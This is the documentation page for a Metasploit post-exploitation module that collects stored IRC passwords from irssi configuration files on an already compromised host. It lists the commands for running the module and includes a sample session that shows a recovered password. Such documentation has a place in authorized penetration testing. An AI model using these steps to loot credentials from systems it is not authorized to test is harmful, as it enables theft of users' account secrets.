## Vulnerable Application

[irssi](https://irssi.org/) an IRC and chat client.

This module was successfully tested against:

- OSX 10.10.5 and IRSSI version 0.8.19

## Verification Steps

  1. Get a `shell` or `meterpreter` session on some host.
  2. Do: ```use post/multi/gather/irssi_creds```
  3. Do: ```set SESSION [SESSION_ID]```
  4. Do: ```run```
  5. If the system has readable configuration files containing irc passwords, they will be printed out.

## Scenarios

### OSX 10.10.5 and IRSSI version 0.8.19

```
msf post(irssi_creds) > run

[*] Finding ~/.irssi/config
[*] Looting 1 files
[+] Found a IRC password(s): chubbybunnies
[+] IRC password(s) stored in /Users/[REDACTED]/.msf/loot/20170405005410_default_[REDACTED]_irc.password_744582.txt
[*] Post module execution completed
```
